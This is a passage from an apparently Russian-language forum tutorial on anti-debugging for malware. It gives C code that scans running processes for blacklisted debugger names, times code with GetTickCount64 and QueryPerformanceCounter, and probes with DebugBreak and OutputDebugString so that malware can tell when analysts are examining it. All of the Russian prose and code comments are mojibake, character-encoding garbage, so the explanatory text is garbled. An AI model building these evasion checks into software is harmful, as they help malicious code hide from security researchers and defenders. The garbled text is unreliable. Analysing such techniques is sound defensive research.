    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf(&quot;\t[!] CreateToolhelp32Snapshot –Ω–µ —É–¥–∞–ª–æ—Å—å : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    if (!Process32FirstW(hSnapShot, &amp;ProcEntry)) {
        printf(&quot;\t[!] Process32FirstW –Ω–µ —É–¥–∞–ª–æ—Å—å : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    do {
        // –ü–µ—Ä–µ–±–∏—Ä–∞–µ—Ç –º–∞—Å—Å–∏–≤ &#039;g_BlackListedDebuggers&#039; –∏ —Å—Ä–∞–≤–Ω–∏–≤–∞–µ—Ç –∫–∞–∂–¥—ã–π —ç–ª–µ–º–µ–Ω—Ç —Å —Ç–µ–∫—É—â–∏–º –∏–º–µ–Ω–µ–º –ø—Ä–æ—Ü–µ—Å—Å–∞, –ø–æ–ª—É—á–µ–Ω–Ω—ã–º –∏–∑ —Å–Ω–∏–º–∫–∞
        for (int i = 0; i &lt; BLACKLISTARRAY_SIZE; i++){
            if (wcscmp(ProcEntry.szExeFile, g_BlackListedDebuggers[i]) == 0) {
                // –û–±–Ω–∞—Ä—É–∂–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫
                wprintf(L&quot;\t[i] –ù–∞–π–¥–µ–Ω \&quot;%s\&quot; —Å PID : %d \n&quot;, ProcEntry.szExeFile, ProcEntry.th32ProcessID);
                bSTATE = TRUE;
                break;
            }
        }

    } while (Process32Next(hSnapShot, &amp;ProcEntry));


_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ —Ç–æ—á–µ–∫ –æ—Å—Ç–∞–Ω–æ–≤–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º GetTickCount64</b><br />
<br />
–¢–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º—ã –≤ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–π —Ç–æ—á–∫–µ, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ–≤–µ—Å—Ç–∏ –∞–Ω–∞–ª–∏–∑ –ø–∞–º—è—Ç–∏, —Å–æ—Å—Ç–æ—è–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤, –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –∏ –º–Ω–æ–≥–æ–≥–æ –¥—Ä—É–≥–æ–≥–æ.<br />
<br />
–ü—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∫—É –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –º–æ–∂–Ω–æ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º WinAPI GetTickCount64. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–∞–µ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥, –ø—Ä–æ—à–µ–¥—à–∏—Ö —Å –º–æ–º–µ–Ω—Ç–∞ –∑–∞–ø—É—Å–∫–∞ —Å–∏—Å—Ç–µ–º—ã. –ê–Ω–∞–ª–∏–∑ –≤—Ä–µ–º–µ–Ω–∏, –∑–∞—Ç—Ä–∞—á–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–º –º–µ–∂–¥—É –¥–≤—É–º—è –≤—ã–∑–æ–≤–∞–º–∏ GetTickCount64, –º–æ–∂–µ—Ç —É–∫–∞–∑–∞—Ç—å, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ª–∏ –æ—Ç–ª–∞–¥–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è. –ï—Å–ª–∏ –≤—Ä–µ–º—è –ø—Ä–µ–≤—ã—à–∞–µ—Ç –æ–∂–∏–¥–∞–µ–º–æ–µ, —Ç–æ –º–æ–∂–Ω–æ –ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏—Ç—å, —á—Ç–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ –æ—Ç–ª–∞–∂–∏–≤–∞–µ—Ç—Å—è.<br />
<br />
–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∑–∞–¥–µ—Ä–∂–µ–∫ —Ç–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞ –º–æ–∂–Ω–æ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å, –≤—ã—á–∏—Å–ª–∏–≤ —Å—Ä–µ–¥–Ω–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ T1 - T0 –∏ —Å–æ—Ö—Ä–∞–Ω—è—è –µ–≥–æ –∫–∞–∫ –∂–µ—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ. –ï—Å–ª–∏ —Ä–∞–∑–Ω–∏—Ü–∞ –º–µ–∂–¥—É T1 –∏ T0 –ø—Ä–µ–≤—ã—à–∞–µ—Ç —ç—Ç–æ –∑–Ω–∞—á–µ–Ω–∏–µ, —Ç–æ –∑–∞–¥–µ—Ä–∂–∫–∞, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ, –≤—ã–∑–≤–∞–Ω–∞ —Ç–æ—á–∫–æ–π –æ—Å—Ç–∞–Ω–æ–≤–∞. –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ —Ä–∞–∑–Ω–∏—Ü–∞ –º–µ–∂–¥—É T1 - T0 –Ω–∞ —Ö–æ—Å—Ç-–º–∞—à–∏–Ω–µ —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç 20 —Å–µ–∫—É–Ω–¥, –Ω–æ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è –±–æ–ª—å—à–µ –≤—Ä–µ–º–µ–Ω–∏, —Ç–æ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç —Å–∏–ª—å–Ω–∞—è –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å, —á—Ç–æ –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É —ç—Ç–∏–º–∏ –¥–≤—É–º—è —Ç–æ—á–∫–∞–º–∏ –≤—ã–∑–≤–∞–Ω–∞ —Ç–æ—á–∫–æ–π –æ—Å—Ç–∞–Ω–æ–≤–∞. –ò—Å—Ö–æ–¥–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ —Å–ª–µ–¥—É–µ—Ç –Ω–µ–º–Ω–æ–≥–æ —É–≤–µ–ª–∏—á–∏—Ç—å, —á—Ç–æ–±—ã —É—á–µ—Å—Ç—å –º–µ–¥–ª–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä—ã.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787167799.png"
		data-src="https://osint42.org/attachments/1746787167799-png.245/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787167799-png.245/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787167799.png"
			title="1746787167799.png"
			width="1342" height="572" loading="lazy" />
	</div><br />
<br />
<b>–ö–æ–¥ –∞–Ω—Ç–∏–¥–µ–±–∞–≥–≥–∏–Ω–≥–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º GetTickCount64</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è TimeTickCheck –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ª–∏ –æ—Ç–ª–∞–¥–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è, –ø—É—Ç–µ–º –∞–Ω–∞–ª–∏–∑–∞ —Ä–∞–∑–Ω–∏—Ü—ã –º–µ–∂–¥—É –¥–≤—É–º—è –≤—ã–∑–æ–≤–∞–º–∏ GetTickCount64. –ï—Å–ª–∏ —Ä–∞–∑–Ω–∏—Ü–∞ –±–æ–ª—å—à–µ –∑–∞–¥–∞–Ω–Ω–æ–≥–æ –ø–æ—Ä–æ–≥–∞, —Ç–æ —Å—á–∏—Ç–∞–µ—Ç—Å—è, —á—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –æ—Ç–ª–∞–¥–∫–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>DWORD64 TimeTickCheck() {

    DWORD64 T0 = 0;
    DWORD64 T1 = 0;

    // –ó–∞–ø–æ–º–Ω–∏—Ç—å –Ω–∞—á–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è
    T0 = GetTickCount64();

    // –í—ã–ø–æ–ª–Ω–∏—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –¥–µ–π—Å—Ç–≤–∏—è, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã —Ç–æ—á–∫–æ–π –æ—Å—Ç–∞–Ω–æ–≤–∞

    // –ü–æ–ª—É—á–∏—Ç—å –≤—Ä–µ–º—è –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏–π
    T1 = GetTickCount64();

    // –í—ã—á–∏—Å–ª–∏—Ç—å —Ä–∞–∑–Ω–∏—Ü—É
    DWORD64 TimeDiff = T1 - T0;

    return TimeDiff;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ —Ç–æ—á–µ–∫ –æ—Å—Ç–∞–Ω–æ–≤–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º QueryPerformanceCounter </b><br />
<br />
–§—É–Ω–∫—Ü–∏—è QueryPerformanceCounter WinAPI –∞–Ω–∞–ª–æ–≥–∏—á–Ω–∞ —Ä–∞–Ω–µ–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ GetTickCount64 WinAPI. –†–∞–∑–Ω–∏—Ü–∞ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ QueryPerformanceCounter –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≤—ã—Å–æ–∫–æ—Ä–∞–∑—Ä–µ—à–∞—é—â–∏–π —Å—á–µ—Ç—á–∏–∫ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ–º—ã–π –∞–ø–ø–∞—Ä–∞—Ç–Ω—ã–º –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ–º, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –∏–∑–º–µ—Ä—è—Ç—å –≤—Ä–µ–º—è —Å —Ç–æ—á–Ω–æ—Å—Ç—å—é –¥–æ –Ω–∞–Ω–æ—Å–µ–∫—É–Ω–¥, –≤ —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ GetTickCount64 –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å—á–µ—Ç—á–∏–∫ –≤—Ä–µ–º–µ–Ω–∏, —É–≤–µ–ª–∏—á–∏–≤–∞—é—â–∏–π—Å—è –∫–∞–∂–¥—É—é –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥—É. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è QueryPerformanceCounter –∏–∑–≤–ª–µ–∫–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ —Å—á–µ—Ç—á–∏–∫–∞ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –≤ –µ–¥–∏–Ω–∏—Ü–∞—Ö —Å—á–µ—Ç–∞, –∞ –Ω–µ –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥–∞—Ö.<br />
<br />
–§—É–Ω–∫—Ü–∏—è TimeTickCheck2 –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é QueryPerformanceCounter WinAPI –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è —Ç–æ—á–µ–∫ –æ—Å—Ç–∞–Ω–æ–≤–∞. –û–Ω–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ —Ä–∞–∑–Ω–∏—Ü–∞ –º–µ–∂–¥—É Time2.QuadPart –∏ Time1.QuadPart –ø—Ä–µ–≤—ã—à–∞–µ—Ç —Å—Ä–µ–¥–Ω–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞ –º–µ–∂–¥—É —ç—Ç–∏–º–∏ –º–æ–º–µ–Ω—Ç–∞–º–∏, –∫–æ—Ç–æ—Ä–æ–µ —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç 100000 –µ–¥–∏–Ω–∏—Ü —Å—á–µ—Ç–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL TimeTickCheck2() {

    LARGE_INTEGER    Time1    = { 0 },
                    Time2    = { 0 };

    if (!QueryPerformanceCounter(&amp;Time1)) {
        printf(&quot;\t[!] QueryPerformanceCounter [1] Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

/*
    –î–†–£–ì–û–ô –ö–û–î
*/

    if (!QueryPerformanceCounter(&amp;Time2)) {
        printf(&quot;\t[!] QueryPerformanceCounter [2] Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;\t[i] (Time2.QuadPart - Time1.QuadPart) : %d \n&quot;, (Time2.QuadPart - Time1.QuadPart));

    if ((Time2.QuadPart - Time1.QuadPart) &gt; 100000){
        return TRUE;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º DebugBreak</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è DebugBreak –≤—ã–∑—ã–≤–∞–µ—Ç –∏—Å–∫–ª—é—á–µ–Ω–∏–µ —Ç–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞, EXCEPTION_BREAKPOINT, –≤ —Ç–µ–∫—É—â–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ. –≠—Ç–æ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ –æ—Ç–ª–∞–¥—á–∏–∫–æ–º, –µ—Å–ª–∏ –æ–Ω –ø–æ–¥–∫–ª—é—á–µ–Ω –∫ —Ç–µ–∫—É—â–µ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É. –¢–µ—Ö–Ω–∏–∫–∞ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –≤—ã–∑–æ–≤–µ –∏—Å–∫–ª—é—á–µ–Ω–∏—è –∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —Ç–æ–≥–æ, –ø–æ–ø—ã—Ç–∞–µ—Ç—Å—è –ª–∏ –æ—Ç–ª–∞–¥—á–∏–∫ –µ–≥–æ –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å.<br />
<br />
–î–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∏—Å–∫–ª—é—á–µ–Ω–∏—è –∏–∑ –≤—ã–∑–æ–≤–∞ DebugBreak –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –±–ª–æ–∫ –∫–æ–¥–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º __try –∏ __except, –∏ —Ñ—É–Ω–∫—Ü–∏—è GetExceptionCode –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∫–æ–¥–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏—è. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –¥–≤–∞ –≤–æ–∑–º–æ–∂–Ω—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏—è:<br />
<ol>
<li data-xf-list-type="ol">–ï—Å–ª–∏ –∏–∑–≤–ª–µ—á–µ–Ω–Ω–æ–µ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ —Ä–∞–≤–Ω–æ EXCEPTION_BREAKPOINT, —Ç–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è EXCEPTION_EXECUTE_HANDLER, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –±—ã–ª–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ –æ—Ç–ª–∞–¥—á–∏–∫–æ–º.</li>
<li data-xf-list-type="ol">–ï—Å–ª–∏ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ —Ä–∞–≤–Ω–æ EXCEPTION_BREAKPOINT, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –æ—Ç–ª–∞–¥—á–∏–∫ –æ–±—Ä–∞–±–æ—Ç–∞–ª –≤–æ–∑–Ω–∏–∫—à–µ–µ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ (–∏ –Ω–µ –Ω–∞—à –±–ª–æ–∫ try-except), —Ç–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è EXCEPTION_CONTINUE_SEARCH, —á—Ç–æ –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç –æ—Ç–ª–∞–¥—á–∏–∫ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –≤–æ–∑–Ω–∏–∫—à–µ–µ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ.</li>
</ol>–§—É–Ω–∫—Ü–∏—è DebugBreakCheck –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç FALSE, –µ—Å–ª–∏ —Ñ—É–Ω–∫—Ü–∏—è DebugBreak WinAPI —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª–∞—Å—å –∏ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –±—ã–ª–æ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–æ/–æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ –æ—Ç–ª–∞–¥—á–∏–∫–æ–º, –∞ –≤–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ –Ω–∞—à–∏–º –±–ª–æ–∫–æ–º try-except, —á—Ç–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ —Ç–æ, —á—Ç–æ –∫ —Ç–µ–∫—É—â–µ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL DebugBreakCheck() {

    __try {
        DebugBreak();
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        // –µ—Å–ª–∏ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ —Ä–∞–≤–Ω–æ EXCEPTION_BREAKPOINT, —Ç–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è EXCEPTION_EXECUTE_HANDLER, –∏ —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç FALSE
        return FALSE;
    }

    // –µ—Å–ª–∏ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ —Ä–∞–≤–Ω–æ EXCEPTION_BREAKPOINT, —Ç–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è EXCEPTION_CONTINUE_SEARCH, –∏ —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º OutputDebugString</b><br />
<br />
–ï—â–µ –æ–¥–Ω–∏–º WinAPI, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –æ—Ç–ª–∞–¥—á–∏–∫–æ–≤, —è–≤–ª—è–µ—Ç—Å—è OutputDebugString. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å—Ç—Ä–æ–∫–∏ –≤ –æ—Ç–ª–∞–¥—á–∏–∫ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è. –ï—Å–ª–∏ –æ—Ç–ª–∞–¥—á–∏–∫ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç, —Ç–æ OutputDebugString —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Å–≤–æ—é –∑–∞–¥–∞—á—É.<br />
<br />
–ú–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å OutputDebugString –∏ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –Ω–µ –ø—Ä–æ–∏–∑–æ—à–ª–∞ –ª–∏ –æ—à–∏–±–∫–∞, –∏—Å–ø–æ–ª—å–∑—É—è GetLastError. –ï—Å–ª–∏ –ø—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞, —Ç–æ GetLastError –≤–µ—Ä–Ω–µ—Ç –Ω–µ–Ω—É–ª–µ–≤–æ–π –∫–æ–¥ –æ—à–∏–±–∫–∏. –ù–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –∫–æ–¥–∞ –æ—à–∏–±–∫–∏ –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω–æ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏—é –æ—Ç–ª–∞–¥—á–∏–∫–∞. –ï—Å–ª–∏ GetLastError –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –Ω–æ–ª—å, —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ OutputDebugString —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏–ª —Å—Ç—Ä–æ–∫—É –æ—Ç–ª–∞–¥—á–∏–∫—É.<br />
<br />
–§—É–Ω–∫—Ü–∏—è OutputDebugStringCheck –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≤—ã—à–µ—É–∫–∞–∑–∞–Ω–Ω—É—é –ª–æ–≥–∏–∫—É –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ —Ñ—É–Ω–∫—Ü–∏—è OutputDebugStringW –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –æ–Ω–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç SetLastError –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∑–Ω–∞—á–µ–Ω–∏—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –æ—à–∏–±–∫–∏ –≤ 1. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –ø—Ä–æ—Å—Ç–æ –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ —ç—Ç–æ –Ω–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–µ—Ä–µ–¥ –≤—ã–∑–æ–≤–æ–º OutputDebugString, —á—Ç–æ–±—ã —É–º–µ–Ω—å—à–∏—Ç—å –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ª–æ–∂–Ω—ã—Ö —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–π.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL OutputDebugStringCheck() {

    SetLastError(1);
    OutputDebugStringW(L&quot;Ru-sfera is debug&quot;);

    // –µ—Å–ª–∏ GetLastError —Ä–∞–≤–Ω–æ 0, —Ç–æ OutputDebugStringW –≤—ã–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ
    if (GetLastError() == 0) {
        return TRUE;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø—Ä–æ–≤–µ—Ä–∫–∏ –æ—à–∏–±–æ–∫ </b><br />
<br />
